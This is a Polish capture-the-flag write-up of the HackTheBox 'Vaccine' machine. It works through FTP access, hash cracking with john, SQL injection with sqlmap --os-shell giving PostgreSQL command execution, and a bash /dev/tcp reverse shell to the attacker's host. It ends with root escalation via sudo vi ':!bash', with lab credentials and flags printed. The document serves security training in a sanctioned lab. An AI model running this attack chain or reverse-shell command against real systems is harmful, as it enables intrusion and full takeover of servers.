---
title: "HackTheBox - Vaccine"
date: "2025-11-19"
excerpt: "kompaktowa ścieżka: FTP → zip2john → MD5 → SQLi → sqlmap --os-shell → PostgreSQL RCE → sudo vi → root. Warto zapamiętać sqlmap --os-shell i eskalację przez vi z GTFOBins."
platform: "HackTheBox"
difficulty: "Bardzo Łatwa"
solveTime: "1h 35min"
---

## Narzędzia/techniki

- `nmap`
- `ftp` (anon)
- `zip2john`, `john`
- `hash-identifier` / `hashid`
- przeglądarka + DevTools (parametry `GET`)
- `curl` (debug requestów – opcjonalnie)
- `sqlmap` (`-os-shell`)
- reverse shell: `nc`, `bash -c 'bash -i >& /dev/tcp/…'`
- `python3 -m http.server` (ściąganie plików z maszyny)
- klasyczne linuksowe (`cat`, `find`, `sudo`, `vi`, `id`, `whoami`)

---

## Podsumowanie

Maszyna Vaccine opiera się na słabym zarządzaniu hasłami i błędnym ustawieniu uprawnień:

zaczynamy od anonimowego FTP z backupem aplikacji, łamiemy hasła ZIP-a i MD5, logujemy się do panelu WWW, wykorzystujemy SQLi w parametrze `search` i `sqlmap --os-shell` do uzyskania shella jako `postgres`, z pliku `dashboard.php` wyciągamy hasło do DB/System, a następnie przez `sudo /bin/vi ...` + `:!bash` eskalujemy do roota.

---


## 1. Skan portów

- Komenda:
    
    ```bash
    nmap -sC -sV 10.129.15.229
    ```
    

Kluczowe odkrycie:

- `21/tcp` – FTP (vsftpd 3.0.3), **anon login allowed**, plik `backup.zip`
- `22/tcp` – SSH (OpenSSH 8.0p1)
- `80/tcp` – HTTP (Apache 2.4.41, “MegaCorp Login”)
    
    ![1 nmap-min.jpg](/images/writeups/htb-vaccine/1_nmap-min.jpg)

---

## 2. FTP – pobranie backupu

- Komenda:
    
    ```bash
    ftp 10.129.15.229
    # login: anonymous
    # password: cokolwiek
    get backup.zip
    bye
    ```
    
- Kluczowe odkrycie:
    - Anonimowy dostęp do FTP.
    - W katalogu leży `backup.zip` (2533 bytes).
        
        ![2 ftp-min.jpg](attachment:f219a750-a782-41fb-b1cf-9a465eb8d199:2_ftp-min.jpg)
        

---

## 3. Łamanie hasła do backup.zip (zip2john + john)

- Komendy:
    
    ```bash
    zip2john backup.zip > backup.hash
    john --wordlist=/usr/share/wordlists/rockyou.txt backup.hash
    ```
    
- Wynik Johna:
    
    ```
    741852963        (backup.zip)
    ```
    
- Kluczowe:
    - Hasło do archiwum ZIP to: **`741852963`**.
        
        ![3 john-min.jpg](attachment:b8b56d31-9fc7-4b4e-af2c-0e023d2be56e:3_john-min.jpg)
        

---

## 4. Analiza backupu i hash MD5 z index.php

- Rozpakowanie:
    
    ```bash
    unzip backup.zip -d backup
    ls -R backup
    ```
    
- Zawartość:
    - `backup/index.php`
    - `backup/style.css`
- Kluczowy fragment `index.php`:
    
    ```php
    if($_POST['username'] === 'admin' && md5($_POST['password']) === "2cb42f8734ea607eefed3b70af13bbd3") {
        $_SESSION['login'] = "true";
        header("Location: dashboard.php");
    }
    ```
    
- Hash hasła admina (MD5):`2cb42f8734ea607eefed3b70af13bbd3`
    
    ![4 indexphp-min.jpg](attachment:5b566b7b-58b4-4f70-ba7a-e311534e0efd:4_indexphp-min.jpg)
    

---

## 5. Identyfikacja i łamanie MD5 admina

- Identyfikacja typu hasha:
    
    ```bash
    hash-identifier
    # HASH: 2cb42f8734ea607eefed3b70af13bbd3
    # Possible Hashes: MD5, ...
    ```
    
- Zapis hasha:
    
    ```bash
    echo "2cb42f8734ea607eefed3b70af13bbd3" > admin.hash
    ```
    
- Łamanie MD5:
    
    ```bash
    john --format=Raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt admin.hash
    john --show --format=Raw-MD5 admin.hash
    ```
    
- Wynik:
    
    ```
    qwerty789
    ```
    
- Kluczowe:
    - Hasło użytkownika `admin` na stronie: **`qwerty789`**.

---

## 6. Logowanie do panelu WWW

- URL:
    
    ```
    <http://10.129.15.229/>
    ```
    
- Dane logowania:
    - Username: `admin`
    - Password: `qwerty789`
- Po zalogowaniu:
    - Strona `dashboard.php` z tabelą “MegaCorp Car Catalogue” + pole `Search`.
        
        ![5 admin panel-min.jpg](attachment:6c84a268-d165-43f7-9f08-67cf6b77885a:5_admin_panel-min.jpg)
        

---

## 7. Identyfikacja podatnego parametru `search`

- Formularz w `dashboard.php`:
    
    ```html
    <form action="" method="GET">
      <div class="search-box">
        <input type="search" name="search" placeholder="Search">
        <button type="submit" class="search-btn"><i class="fa fa-search"></i></button>
      </div>
    </form>
    ```
    
- Testowe zapytanie:
    
    ```
    <http://10.129.15.229/dashboard.php?search=test>
    ```
    
- Wniosek:
    - Parametr `search` (GET) jest kandydatem do SQLi.

---

## 8. sqlmap – SQLi + `-os-shell` (PostgreSQL RCE)

- Komenda:
    
    ```bash
    sqlmap -u "<http://10.129.15.229/dashboard.php?search=test>" \\
      --cookie="PHPSESSID=0k5i733cnchreg5j1c804re0mi" \\
      --batch \\
      --os-shell
    ```
    
- Kluczowe fragmenty outputu:
    - Wykrycie podatności:
        
        ```
        GET parameter 'search' appears to be 'PostgreSQL AND boolean-based blind ...' injectable
        GET parameter 'search' is 'PostgreSQL AND error-based - WHERE or HAVING clause' injectable
        GET parameter 'search' appears to be 'PostgreSQL > 8.1 stacked queries (comment)' injectable
        GET parameter 'search' appears to be 'PostgreSQL > 8.1 AND time-based blind' injectable
        ...
        back-end DBMS: PostgreSQL
        ```
        
    - Przejście do OS-shell:
        
        ```
        [INFO] testing if current user is DBA
        [INFO] retrieved: '1'
        [INFO] going to use 'COPY ... FROM PROGRAM ...' command execution
        [INFO] calling Linux OS shell. To quit type 'x' or 'q' and press ENTER
        os-shell>
        ```
        
- Znaczenie:
    - sqlmap wykorzystał podatność SQLi, żeby:
        - zidentyfikować PostgreSQL,
        - potwierdzić uprawnienia DBA,
        - skorzystać z `COPY ... FROM PROGRAM ...` do zdalnego uruchamiania komend systemowych.
        
        ![6 sqlmap-min.jpg](attachment:109d57cc-90ff-40c4-a76e-b9ea21cda961:6_sqlmap-min.jpg)
        

---

## 9. OS-shell (sqlmap) → identyfikacja użytkownika

- Komendy w os-shell:
    
    ```
    os-shell> whoami
    # postgres
    
    os-shell> id
    # uid=111(postgres) gid=117(postgres) groups=117(postgres),116(ssl-cert)
    
    os-shell> pwd
    # /var/lib/postgresql/11/main
    ```
    
- Kluczowe:
    - Wykonujemy komendy jako użytkownik systemowy **`postgres`** w katalogu danych PostgreSQL.

---

## 10. Reverse shell z os-shell sqlmapa

- Na Kali:
    
    ```bash
    nc -lvnp 4444
    ```
    
- W os-shell:
    
    ```
    os-shell> bash -c 'bash -i >& /dev/tcp/10.10.14.143/4444 0>&1'
    ```
    
- Po stronie Kali:
    
    ```
    connect to [10.10.14.143] from (UNKNOWN) [10.129.15.229] 34450
    bash: no job control in this shell
    postgres@vaccine:/var/lib/postgresql/11/main$
    ```
    
- Stabilizacja TTY:
    
    ```bash
    python3 -c 'import pty; pty.spawn("/bin/bash")'
    export TERM=xterm
    ```
    
- Kluczowe:
    - Mamy normalny shell jako `postgres` przez TCP (niezależny od sqlmap, żyje mimo timeoutów sqlmapa).
    
    ![7 reverse shell-min.jpg](attachment:14f5a08b-35ca-40d1-8567-14742bc3d494:7_reverse_shell-min.jpg)
    

---

## 11. Szukanie user flag

- Szybka enumeracja:
    
    ```bash
    ls /home
    # ftpuser  simon
    ```
    
- Globalne szukanie user flag:
    
    ```bash
    find / -maxdepth 5 -type f -name "user.txt" 2>/dev/null
    # /var/lib/postgresql/user.txt
    
    cat /var/lib/postgresql/user.txt
    # ec9b13ca4d6229cd5cc1e09980965bf7
    ```
    
- Kluczowe odkrycie:
    - **user flag**: `ec9b13ca4d6229cd5cc1e09980965bf7`

---

## 12. Wyciągnięcie hasła do `postgres` z dashboard.php

- HTTP serwer na ofierze:
    
    ```bash
    cd /var/www/html
    python3 -m http.server 8000
    ```
    
- Pobranie pliku z Kali:
    
    ```bash
    curl <http://10.129.15.229:8000/dashboard.php> -o dashboard.php
    ```
    
- Kluczowy fragment `dashboard.php`:
    
    ```php
    $conn = pg_connect("host=localhost port=5432 dbname=carsdb user=postgres password=P@s5w0rd!");
    ```
    
- Kluczowe:
    - Hasło do DB (i systemowego konta): **`P@s5w0rd!`**[tu wstaw screenshot: fragment dashboard.php z connection stringiem]
    
    ![8 haslo-min.jpg](attachment:fc42940f-8373-45e5-9edf-3a9547259d00:8_haslo-min.jpg)
    

---

## 13. `sudo -l` jako postgres

- W reverse shellu:
    
    ```bash
    sudo -l
    # [sudo] password for postgres: P@s5w0rd!
    ```
    
- Output:
    
    ```
    Matching Defaults entries for postgres on vaccine:
        env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", ...
    User postgres may run the following commands on vaccine:
        (ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf
    ```
    
- Kluczowe:
    - Użytkownik `postgres` może uruchomić **/bin/vi** na `/etc/postgresql/11/main/pg_hba.conf` z użyciem `sudo` (czyli jako root).
    - To jest odpowiedź na Task 7: program → **`vi` (/bin/vi)**.
        
        ![9 sudo -l-min.jpg](attachment:58f65243-9649-4a7d-9459-7011a76c7ea2:9_sudo_-l-min.jpg)
        

---

## 14. Eskalacja na roota przez `vi` (GTFOBins)

- Uruchomienie `vi` jako root:
    
    ```bash
    sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
    # hasło: P@s5w0rd!
    ```
    
- W `vi`:
    - `ESC` (na wszelki wypadek),
    - wpisano:
        
        ```
        :!bash
        ```
        
        i `ENTER`
        
- Nowy shell:
    
    ```bash
    whoami
    # root
    id
    # uid=0(root) gid=0(root) groups=0(root)
    ```
    
- Kluczowe:
    - `vi` odpalone przez `sudo` działa jako root,
    - `:!bash` uruchamia basha z uprawnieniami roota → pełny root shell.
        
        ![10 root-min.jpg](attachment:9e28f3dc-9baa-4af4-b9e1-ebf3914043f3:10_root-min.jpg)
        

---

## 15. Root flag

- Komendy:
    
    ```bash
    cd /root
    ls
    # pg_hba.conf  root.txt  snap
    
    cat root.txt
    # dd6e058e814260bc70e9bbdef2715849
    ```
    
- Kluczowe odkrycie:
    - **root flag**: `dd6e058e814260bc70e9bbdef2715849`

---

## Wnioski / czego się nauczyłem

- **sqlmap `-os-shell`**:
    - sqlmap automatycznie wykrywa SQLi, fingerprintuje DB (tu PostgreSQL),
    i przy odpowiednich uprawnieniach (DBA) potrafi zbudować OS-shell używając:
        - `COPY ... FROM PROGRAM ...` (wbudowany mechanizm PostgreSQL do uruchamiania komend systemowych).
- Hash cracking workflow:
    - `zip2john` + `john` → łamanie hasła do ZIP (`741852963`),
    - `hash-identifier` + `john --format=Raw-MD5` → łamanie MD5 (`qwerty789`).
- **Hasła w kodzie aplikacji**:
    - Aplikacja PHP (`dashboard.php`) przechowuje dane do DB:
        
        ```php
        user=postgres password=P@s5w0rd!
        ```
        
    - Te same dane często działają jako hasło systemowe (`sudo -l` dla `postgres`).
- **`sudo -l` + stderr w os-shell**:
    - W os-shell sqlmapa `sudo -l` dawało “No output”, bo output leciał na stderr.
    - Warto pamiętać o:
        
        ```bash
        sudo -l 2>&1
        ```
        
    - oraz, że i tak finalnie lepiej iść w normalny reverse shell + pty.
- **GTFOBins – `vi` → root**:
    - Jeśli `sudo -l` pokazuje coś typu:
        
        ```
        (ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf
        ```
        
    - można eskalować:
        
        ```bash
        sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
        :!bash
        ```
        
- **Niestabilny reverse shell / TTY to realny problem**
    - Reverse shell przez:
        
        ```bash
        bash -c 'bash -i >& /dev/tcp/10.10.14.143/4444 0>&1'
        ```
        
        i stabilizacja:
        
        ```bash
        python3 -c 'import pty; pty.spawn("/bin/bash")'
        export TERM=xterm
        ```
        
        - `nc -lvnp 4444` działał, ale:
        - terminal często zachowywał się dziwnie (dziwne komunikaty, “krzaki”, problemy z wejściem/wyjściem),
        - kilka razy shell po prostu “umierał” i wracałem do prompta albo traciłem połączenie.
    - W praktyce **musiałem kilkukrotnie powtarzać cały łańcuch**:
        - odpalić sqlmap, żeby dostać os-shell,
        - z os-shell puścić reverse shell (`bash -c 'bash -i >& /dev/tcp/...'`),
        - na nowym shellu znów robić `python3 -c 'import pty; pty.spawn("/bin/bash")'` + `export TERM=xterm`.
    - To pokazuje, że przy takich “sklejanych” shellach trzeba być gotowym na to, że sesja się rozpadnie i trzeba ją będzie po prostu odtworzyć.
- **Interaktywne aplikacje (nano/vi) potrafią zabić sesję**
    - Na takim niestabilnym shellu:
        - uruchamianie `nano`, `vi`, `top` itp. często psuło wyświetlanie albo kończyło się utratą sesji,
        - **vi użyłem tylko tam, gdzie musiałem** – konkretnie:
        a potem w środku `:!bash` do eskalacji na roota.
            
            ```bash
            sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
            ```
            
    - Do samego podglądu plików dużo bezpieczniej było używać `cat`,
- **Czasem szybciej jest “ściągnąć plik” niż męczyć się z edytorem na słabym TTY**
    - Zamiast czytać `dashboard.php` w niestabilnym terminalu, zrobiłem:
        - na maszynie:
            
            ```bash
            cd /var/www/html
            python3 -m http.server 8000
            ```
            
        - na Kali:
            
            ```bash
            curl <http://10.129.15.229:8000/dashboard.php> -o dashboard.php
            ```
            
        - i dopiero lokalnie spokojnie przejrzałem plik.
    - To podejście okazało się dużo wygodniejsze, niż walka z `nano`/`vi` na słabym shellu.
    - Wniosek dla mnie: gdy shell jest niestabilny, opłaca się:
        - używać prostych narzędzi (`cat`, `find`, `curl`),
        - a pliki, które chcę dokładniej analizować, po prostu pobierać na swoją maszynę zamiast otwierać je w interaktywnych edytorach na ofierze.